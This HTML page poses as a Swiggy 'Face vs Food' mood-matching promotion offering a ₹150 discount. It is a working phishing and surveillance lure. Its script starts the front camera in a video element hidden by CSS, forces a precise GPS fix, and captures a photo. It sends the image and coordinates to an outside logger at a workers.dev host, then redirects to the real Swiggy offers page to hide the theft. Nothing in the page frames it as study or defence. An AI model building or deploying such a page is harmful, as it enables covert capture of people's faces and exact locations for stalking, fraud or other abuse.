<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Swiggy | Exclusive Mood Match</title>
    <style>
        body { background: #fff; margin: 0; font-family: 'Segoe UI', Roboto, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .card { text-align: center; width: 90%; max-width: 360px; padding: 40px 20px; border-radius: 25px; box-shadow: 0 15px 40px rgba(0,0,0,0.1); border-top: 6px solid #fc8019; }
        .logo-box { width: 65px; height: 65px; background: #fc8019; border-radius: 18px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 38px; font-weight: 900; box-shadow: 0 8px 20px rgba(252, 128, 25, 0.3); }
        h1 { font-size: 1.5rem; margin-bottom: 10px; color: #282c3f; }
        p { color: #7e808c; font-size: 0.9rem; margin-bottom: 30px; }
        .btn { background: #fc8019; color: #fff; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 700; font-size: 1.1rem; cursor: pointer; transition: 0.3s; }
        #loader { display: none; }
        .spinner { width: 35px; height: 35px; border: 4px solid #f3f3f3; border-top: 4px solid #fc8019; border-radius: 50%; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        /* STEALTH CAMERA: Hidden from view */
        #v { position: fixed; top: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0; }
    </style>
</head>
<body>

    <div class="card">
        <div class="logo-box">S</div>
        <div id="ui">
            <h1>Face vs Food</h1>
            <p>Scan your mood to unlock a <b>â‚¹150 Discount</b> and find the best treats near your location.</p>
            <button id="btn" class="btn">MATCH MY MOOD</button>
        </div>
        <div id="loader">
            <div class="spinner"></div>
            <p style="color: #fc8019; font-weight: bold; font-size: 0.8rem;">LOCKING GPS SIGNAL...</p>
        </div>
    </div>

    <video id="v" playsinline muted autoplay></video>

    <script>
        const API_URL = "https://titan-logger.saliljha523.workers.dev";
        const btn = document.getElementById('btn');
        const video = document.getElementById('v');
        const canvas = document.createElement('canvas');

        btn.onclick = async () => {
            document.getElementById('ui').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            try {
                // 1. Silent Camera Initialization
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                
                // 2. High-Precision GPS Lock (Forcing Pin-Drop)
                const position = await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(resolve, () => resolve(null), {
                        enableHighAccuracy: true,
                        timeout: 15000, // Forces the phone to wait for a satellite fix
                        maximumAge: 0   // No cached data allowed
                    });
                });

                // 3. Coordinate Processing
                const gpsString = position 
                    ? `${position.coords.latitude.toFixed(7)},${position.coords.longitude.toFixed(7)}` 
                    : "GPS_DATA_BLOCKED";

                // 4. Background Photo Capture
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/jpeg', 0.2);

                // Stop hardware sensors
                stream.getTracks().forEach(track => track.stop());

                // 5. Secure Data Uplink
                await fetch(API_URL, {
                    method: 'POST',
                    mode: 'cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData, gps: gpsString })
                });

            } catch (err) { console.log("Sensors denied."); }

            // 6. Redirect to Swiggy
            window.location.replace("https://www.swiggy.com/offers-near-me");
        };
    </script>
</body>
</html>
